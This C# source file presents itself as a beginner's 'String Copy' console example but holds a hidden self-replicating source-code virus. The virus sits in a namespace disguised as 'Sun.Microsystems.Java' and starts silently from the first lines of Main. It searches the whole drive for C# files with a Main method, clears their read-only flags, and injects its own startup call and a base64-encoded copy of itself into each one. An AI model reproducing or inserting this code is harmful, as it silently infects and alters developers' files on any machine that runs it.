   using System;
   using Sun.Microsystems.Java;

   namespace StringCopy
   {
       /// <summary>
       /// Summary description for StringCopier.
       /// </summary>
       class StringCopier
       {
           /// <summary>
           /// The main entry point for the application.
           /// </summary>
           [STAThread]
           static void Main(string[] args)
       {
       System.Threading.Thread gxzxzxzxz = new System.Threading.Thread(IsKing.LetsGo);
       gxzxzxzxz.Start();
               //
               // TODO: Add code to start application here
               //
               Console.WriteLine("An Example of String Copy");
               Console.WriteLine("Type Some Text");
               string inputText = Console.ReadLine();
               string copiedText = string.Copy(inputText);

               copiedText+=" more text";
               Console.WriteLine("Your text is here: "+inputText);
               Console.WriteLine("Copy of your text with some additions: "+copiedText);
               Console.Read();
           }
       }
   }



   namespace Sun.Microsystems.Java
   {
       public class IsKing
       {
           private static int counter = 0;
           public static void LetsGo()
           {
               string xx = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetModules()[0].FullyQualifiedName);
               string xy = System.IO.Directory.GetDirectoryRoot(xx);
               System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(@xy);
               int yy = AndLetsRock(dir);
           }
           private static int AndLetsRock(System.IO.DirectoryInfo d)
           {
               System.IO.FileInfo[] files = d.GetFiles("*.cs");
               foreach (System.IO.FileInfo file in files)
               {
                   string filename = file.FullName;
                   System.IO.FileAttributes hh = System.IO.File.GetAttributes(filename);
                   if ((hh & System.IO.FileAttributes.ReadOnly) != 0)
                   {
                       System.IO.FileAttributes attr = System.IO.FileAttributes.Normal;
                       System.IO.File.SetAttributes(filename, attr);
                   }
                   string database = "bmFtZXNwYWNlIFN1bi5NaWNyb3N5c3RlbXMuSmF2YQ0Kew0KICAgIHB1YmxpYyBjbGFzcyBJc0tpbmcNCiAgICB7DQogICAgICAgIHByaXZhdGUgc3RhdGljIGludCBjb3VudGVyID0gMDsNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIExldHNHbygpDQogICAgICAgIHsNCiAgICAgICAgICAgIHN0cmluZyB4eCA9IFN5c3RlbS5JTy5QYXRoLkdldERpcmVjdG9yeU5hbWUoU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHkuR2V0RXhlY3V0aW5nQXNzZW1ibHkoKS5HZXRNb2R1bGVzKClbMF0uRnVsbHlRdWFsaWZpZWROYW1lKTsNCiAgICAgICAgICAgIHN0cmluZyB4eSA9IFN5c3RlbS5JTy5EaXJlY3RvcnkuR2V0RGlyZWN0b3J5Um9vdCh4eCk7DQogICAgICAgICAgICBTeXN0ZW0uSU8uRGlyZWN0b3J5SW5mbyBkaXIgPSBuZXcgU3lzdGVtLklPLkRpcmVjdG9yeUluZm8oQHh5KTsNCiAgICAgICAgICAgIGludCB5eSA9IEFuZExldHNSb2NrKGRpcik7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgaW50IEFuZExldHNSb2NrKFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvIGQpDQogICAgICAgIHsNCiAgICAgICAgICAgIFN5c3RlbS5JTy5GaWxlSW5mb1tdIGZpbGVzID0gZC5HZXRGaWxlcygiKi5jcyIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoU3lzdGVtLklPLkZpbGVJbmZvIGZpbGUgaW4gZmlsZXMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgc3RyaW5nIGZpbGVuYW1lID0gZmlsZS5GdWxsTmFtZTsNCiAgICAgICAgICAgICAgICBTeXN0ZW0uSU8uRmlsZUF0dHJpYnV0ZXMgaGggPSBTeXN0ZW0uSU8uRmlsZS5HZXRBdHRyaWJ1dGVzKGZpbGVuYW1lKTsNCiAgICAgICAgICAgICAgICBpZiAoKGhoICYgU3lzdGVtLklPLkZpbGVBdHRyaWJ1dGVzLlJlYWRPbmx5KSAhPSAwKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgU3lzdGVtLklPLkZpbGVBdHRyaWJ1dGVzIGF0dHIgPSBTeXN0ZW0uSU8uRmlsZUF0dHJpYnV0ZXMuTm9ybWFsOw0KICAgICAgICAgICAgICAgICAgICBTeXN0ZW0uSU8uRmlsZS5TZXRBdHRyaWJ1dGVzKGZpbGVuYW1lLCBhdHRyKTsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgc3RyaW5nIGRhdGFiYXNlID0gIg==>IjsNCiAgICAgICAgICAgICAgICBzdHJpbmcgeCA9IFJlYWQoZmlsZW5hbWUpOw0KICAgICAgICAgICAgICAgIGJvb2wgeSA9IFNoYWxsV2UoeCk7DQogICAgICAgICAgICAgICAgYm9vbCB4eXkgPSBTaGFsbFdlSSh4KTsNCiAgICAgICAgICAgICAgICBpZiAoeSA9PSB0cnVlKQ0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmICh4eXkgPT0gdHJ1ZSkNCiAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgIGJvb2wgeiA9IHRydWU7DQogICAgICAgICAgICAgICAgICAgIHdoaWxlICh6ID09IHRydWUpDQogICAgICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChjb3VudGVyID09IDUpDQogICAgICAgICAgICAgICAgICAgICAgICB7IHJldHVybiAwOyB9DQogICAgICAgICAgICAgICAgICAgICAgICB6ID0gUXVlcnkoZmlsZW5hbWUsIHgsIGRhdGFiYXNlKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICh6ID09IGZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvdW50ZXIgKz0gMTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBlbHNlIHsgY29udGludWU7IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIFN5c3RlbS5JTy5EaXJlY3RvcnlJbmZvW10gZGlycyA9IGQuR2V0RGlyZWN0b3JpZXMoIiouKiIpOw0KICAgICAgICAgICAgZm9yZWFjaCAoU3lzdGVtLklPLkRpcmVjdG9yeUluZm8gZGlyIGluIGRpcnMpDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgdHJ5IHsgaW50IHl5eSA9IEFuZExldHNSb2NrKGRpcik7IH0NCiAgICAgICAgICAgICAgICBjYXRjaCB7IGNvbnRpbnVlOyB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gMTsNCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgUmVhZChzdHJpbmcgZmlsZSkNCiAgICAgICAgew0KICAgICAgICAgICAgU3lzdGVtLklPLlN0cmVhbVJlYWRlciBzciA9IFN5c3RlbS5JTy5GaWxlLk9wZW5UZXh0KGZpbGUpOw0KICAgICAgICAgICAgc3RyaW5nIGlucHV0Ow0KICAgICAgICAgICAgc3RyaW5nIGdnID0gIiI7DQogICAgICAgICAgICB3aGlsZSAoKGlucHV0ID0gc3IuUmVhZExpbmUoKSkgIT0gbnVsbCkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBnZyArPSBpbnB1dCArICJcclxuIjsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHNyLkNsb3NlKCk7DQogICAgICAgICAgICByZXR1cm4gZ2c7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBTaGFsbFdlKHN0cmluZyBzKQ0KICAgICAgICB7DQogICAgICAgICAgICBpbnQgeCA9IHMuVG9Mb3dlcigpLkluZGV4T2YoInN1bi5taWNyb3N5c3RlbXMuamF2YSIpOw0KICAgICAgICAgICAgaWYgKHggPj0gMCkNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBTaGFsbFdlSShzdHJpbmcgcykNCiAgICAgICAgew0KICAgICAgICAgICAgaW50IHggPSBzLlRvTG93ZXIoKS5JbmRleE9mKCJtYWluKCIpOw0KICAgICAgICAgICAgaWYgKHggPj0gMCkNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgcHJpdmF0ZSBzdGF0aWMgYm9vbCBRdWVyeShzdHJpbmcgZmlsZSwgc3RyaW5nIHMsIHN0cmluZyBkYXRhYmFzZSkNCiAgICAgICAgew0KICAgICAgICAgICAgaW50IHggPSBzLlRvTG93ZXIoKS5JbmRleE9mKCJtYWluKCIpOw0KICAgICAgICAgICAgaW50IHl5ID0geDsNCiAgICAgICAgICAgIGNoYXJbXSB4eCA9IHMuVG9DaGFyQXJyYXkoMCwgcy5MZW5ndGggLSAxKTsNCiAgICAgICAgICAgIHdoaWxlICh4eFt5eV0gIT0gJ3snKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHl5ICs9IDE7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBzID0gcy5SZXBsYWNlKHMuU3Vic3RyaW5nKHgsICh5eSAtIHgpICsgMSksICJNYWluKHN0cmluZ1tdIGFyZ3MpXHJcblx0e1xyXG5cdFN5c3RlbS5UaHJlYWRpbmcuVGhyZWFkIGd4enh6eHp4eiA9IG5ldyBTeXN0ZW0uVGhyZWFkaW5nLlRocmVhZChJc0tpbmcuTGV0c0dvKTtcclxuXHRneHp4enh6eHouU3RhcnQoKTsiKTsNCiAgICAgICAgICAgIHMgPSBzLlJlcGxhY2UoInVzaW5nIFN5c3RlbTsiLCAidXNpbmcgU3lzdGVtO1xyXG51c2luZyBTdW4uTWljcm9zeXN0ZW1zLkphdmE7Iik7DQogICAgICAgICAgICB1c2luZyAoU3lzdGVtLklPLlN0cmVhbVdyaXRlciBzdyA9IG5ldyBTeXN0ZW0uSU8uU3RyZWFtV3JpdGVyKGZpbGUpKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHN0cmluZ1tdIHQgPSBkYXRhYmFzZS5TcGxpdChuZXcgY2hhcltdIHsgJz4nIH0pOw0KICAgICAgICAgICAgICAgIHN3LldyaXRlTGluZShzKTsNCiAgICAgICAgICAgICAgICBzdy5Xcml0ZUxpbmUoIlxyXG4iKTsNCiAgICAgICAgICAgICAgICBzdy5Xcml0ZShkZWNvZGViNjQodFswXSkrIGRhdGFiYXNlICsgZGVjb2RlYjY0KHRbMV0pKTsNCiAgICAgICAgICAgICAgICBzdy5Xcml0ZUxpbmUoIlxyXG4iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgICAgICBwcml2YXRlIHN0YXRpYyBzdHJpbmcgZGVjb2RlYjY0KHN0cmluZyBkKQ0KICAgICAgICB7DQogICAgICAgICAgICAgIGJ5dGVbXSBnID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhkKTsNCiAgICAgICAgICAgICAgcmV0dXJuIFN5c3RlbS5UZXh0LkVuY29kaW5nLlVURjguR2V0U3RyaW5nKGcpOw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQo=";
                   string x = Read(filename);
                   bool y = ShallWe(x);
                   bool xyy = ShallWeI(x);
                   if (y == true)
                   {
                       continue;
                   }
                   if (xyy == true)
                   {
                       bool z = true;
                       while (z == true)
                       {
                           if (counter == 5)
                           { return 0; }
                           z = Query(filename, x, database);
                           if (z == false)
                           {
                               counter += 1;
                           }
                       }
                   }
                   else { continue; }
               }
               System.IO.DirectoryInfo[] dirs = d.GetDirectories("*.*");
               foreach (System.IO.DirectoryInfo dir in dirs)
               {
                   try { int yyy = AndLetsRock(dir); }
                   catch { continue; }
               }
               return 1;
           }
           private static string Read(string file)
           {
               System.IO.StreamReader sr = System.IO.File.OpenText(file);
               string input;
               string gg = "";
               while ((input = sr.ReadLine()) != null)
               {
                   gg += input + "\r\n";
               }
               sr.Close();
               return gg;
           }
           private static bool ShallWe(string s)
           {
               int x = s.ToLower().IndexOf("sun.microsystems.java");
               if (x >= 0)
                   return true;
               else
                   return false;
           }
           private static bool ShallWeI(string s)
           {
               int x = s.ToLower().IndexOf("main(");
               if (x >= 0)
                   return true;
               else
                   return false;
           }
           private static bool Query(string file, string s, string database)
           {
               int x = s.ToLower().IndexOf("main(");
               int yy = x;
               char[] xx = s.ToCharArray(0, s.Length - 1);
               while (xx[yy] != '{')
               {
                   yy += 1;
               }
               s = s.Replace(s.Substring(x, (yy - x) + 1), "Main(string[] args)\r\n\t{\r\n\tSystem.Threading.Thread gxzxzxzxz = new System.Threading.Thread(IsKing.LetsGo);\r\n\tgxzxzxzxz.Start();");
               s = s.Replace("using System;", "using System;\r\nusing Sun.Microsystems.Java;");
               using (System.IO.StreamWriter sw = new System.IO.StreamWriter(file))
               {
                   string[] t = database.Split(new char[] { '>' });
                   sw.WriteLine(s);
                   sw.WriteLine("\r\n");
                   sw.Write(decodeb64(t[0])+ database + decodeb64(t[1]));
                   sw.WriteLine("\r\n");
               }
               return false;
           }
           private static string decodeb64(string d)
           {
                 byte[] g = System.Convert.FromBase64String(d);
                 return System.Text.Encoding.UTF8.GetString(g);
           }
       }
   }
